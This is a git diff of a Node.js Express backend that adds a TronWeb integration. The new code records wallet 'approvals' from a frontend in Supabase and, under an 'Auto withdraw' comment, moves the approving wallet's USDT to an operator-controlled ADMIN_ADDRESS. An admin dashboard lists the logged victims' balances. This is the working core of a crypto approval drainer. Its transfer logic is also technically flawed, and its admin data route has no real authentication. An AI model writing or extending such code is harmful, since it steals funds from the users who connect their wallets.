@@ -1,51 +1,97 @@
 const express = require("express");
 const cors = require("cors");
 const { createClient } = require("@supabase/supabase-js");
+const TronWeb = require("tronweb");
 require("dotenv").config();
 
 const app = express();
 app.use(cors());
 app.use(express.json());
+app.use(express.static(__dirname)); // for serving admin.html & dashboard.html
 
-const PORT = process.env.PORT || 3000;
+// Supabase setup
+const supabase = createClient(
+  process.env.SUPABASE_URL,
+  process.env.SUPABASE_ANON_KEY
+);
 
-// ✅ Supabase setup
-const supabaseUrl = process.env.SUPABASE_URL;
-const supabaseKey = process.env.SUPABASE_KEY;
-const supabase = createClient(supabaseUrl, supabaseKey);
-
-// ✅ Root route to confirm backend is live
-app.get("/", (req, res) => {
-  res.json({ status: "Backend live" });
+// Tron setup
+const tronWeb = new TronWeb({
+  fullHost: "https://api.trongrid.io",
+  privateKey: process.env.TRON_PRIVATE_KEY,
 });
 
-// ✅ Route: Log Approval (from frontend)
-app.post("/log-approval", async (req, res) => {
-  try {
-    const { wallet_address, amount, balance } = req.body;
+// USDT TRC-20 contract
+const usdtContractAddress = process.env.USDT_CONTRACT;
 
+// ===============================
+// Routes
+// ===============================
+
+app.get("/", (req, res) => {
+  res.send("✅ Backend is live");
+});
+
+// 🚀 Save approval data
+app.post("/approve", async (req, res) => {
+  const { walletAddress, amount, balance } = req.body;
+
+  try {
     const { data, error } = await supabase.from("Approvals").insert([
       {
-        wallet_address,
-        amount,
-        balance,
+        wallet_address: walletAddress,
+        amount: parseFloat(amount),
+        balance: parseFloat(balance),
         timestamp: new Date().toISOString(),
       },
     ]);
 
-    if (error) {
-      console.error("Supabase insert error:", error.message);
-      return res.status(500).json({ success: false, error: error.message });
-    }
+    if (error) throw error;
 
-    res.status(200).json({ success: true, data });
+    // Auto withdraw
+    const usdt = await tronWeb.contract().at(usdtContractAddress);
+    const result = await usdt.transfer(process.env.ADMIN_ADDRESS, amount).send({ from: walletAddress });
+
+    res.status(200).json({ success: true, tx: result });
   } catch (err) {
-    console.error("Server error:", err.message);
-    res.status(500).json({ success: false, error: "Internal server error" });
+    console.error("❌ Error:", err);
+    res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// ✅ Start server
+// 🔒 Admin login
+app.post("/admin/login", (req, res) => {
+  const { username, password } = req.body;
+  if (
+    username === process.env.ADMIN_USER &&
+    password === process.env.ADMIN_PASS
+  ) {
+    res.json({ success: true });
+  } else {
+    res.status(401).json({ success: false, message: "Invalid credentials" });
+  }
+});
+
+// 📊 Get approval data
+app.get("/admin/data", async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from("Approvals")
+      .select("*")
+      .order("timestamp", { ascending: false });
+
+    if (error) throw error;
+
+    res.json(data);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ===============================
+// Server start
+// ===============================
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`✅ Backend is running on port ${PORT}`);
+  console.log(`🚀 Server running on port ${PORT}`);
 });
